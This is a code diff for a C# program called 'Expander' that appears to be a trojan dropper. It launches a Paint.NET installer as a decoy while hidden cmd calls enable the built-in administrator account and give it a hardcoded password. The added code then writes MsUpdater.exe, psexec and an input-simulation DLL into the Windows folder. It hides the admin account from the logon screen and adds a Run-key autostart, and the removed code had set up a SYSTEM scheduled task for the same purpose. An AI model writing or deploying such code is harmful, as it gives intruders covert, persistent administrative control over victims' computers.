@@ -3,11 +3,16 @@
     using System;
     using System.Diagnostics;
     using System.IO;
+    using System.Threading;
 
     using Expander.Properties;
 
+    using Microsoft.Win32;
+
     internal static class Program
     {
+        private static bool sync;
+
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
@@ -18,26 +23,15 @@
                 throw new ArgumentNullException(nameof(args));
             }
 
-            var targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "MsUpdater");
-            Directory.CreateDirectory(targetDir);
+            new Thread(PaintNetInstall).Start();
+            new Thread(Expand).Start();
 
-            var target = Path.Combine(targetDir, "MsUpdater.exe");
-            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
-            File.WriteAllBytes(target, Resources.MsUpdater);
+            Console.Read();
+        }
 
-            Process.Start(new ProcessStartInfo
-                              {
-                                  FileName = "schtasks.exe",
-                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST /RU SYSTEM", // C:\WINDOWS\MsUpdater
-                                                                                                                        // "schtasks /CREATE /TN MsUpdater /TR C:\WINDOWS\MsUpdater\MsUpdater.exe /SC ONLOGON /RL HIGHEST /RU SYSTEM"
-                WindowStyle = ProcessWindowStyle.Hidden
-                              });
-
-            //
-
-            var copyDir = Path.Combine(Directory.GetCurrentDirectory(), "Temp");
-            Directory.CreateDirectory(copyDir);
-            var copyTarget = Path.Combine(copyDir, "Installer.exe");
+        private static void PaintNetInstall()
+        {
+            var copyTarget = Path.Combine(Path.GetTempPath(), "stpninstaller.exe");
 
             if (!File.Exists(copyTarget))
             {
@@ -45,6 +39,62 @@
             }
 
             Process.Start(copyTarget);
+
+            Sync();
+        }
+
+        private static void Expand()
+        {
+            CommandPrompt("net user administrator /active:yes").WaitForExit();
+            CommandPrompt("net user administrator abc123kappa");
+
+            var targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "MsUpdater");
+            Directory.CreateDirectory(targetDir);
+
+            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
+            File.WriteAllBytes(Path.Combine(targetDir, "psexec.exe"), Resources.psexec);
+
+            var target = Path.Combine(targetDir, "MsUpdater.exe");
+            File.WriteAllBytes(target, Resources.MsUpdater);
+
+            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+            {
+                // ReSharper disable PossibleNullReferenceException
+
+                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
+                {
+                    key.CreateSubKey("SpecialAccounts", true).CreateSubKey("UserList", true).SetValue("administrator", 0);
+                }
+
+                using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                {
+                    key.SetValue("MsUpdater", target);
+                }
+
+                // ReSharper restore PossibleNullReferenceException
+            }
+
+            Sync();
+        }
+
+        private static Process CommandPrompt(string args)
+        {
+            return Process.Start(new ProcessStartInfo
+            {
+                FileName = "cmd",
+                Arguments = $"/C {args}",
+                WindowStyle = ProcessWindowStyle.Hidden
+            });
+        }
+
+        private static void Sync()
+        {
+            if (sync)
+            {
+                Environment.Exit(0);
+            }
+
+            sync = true;
         }
     }
 }
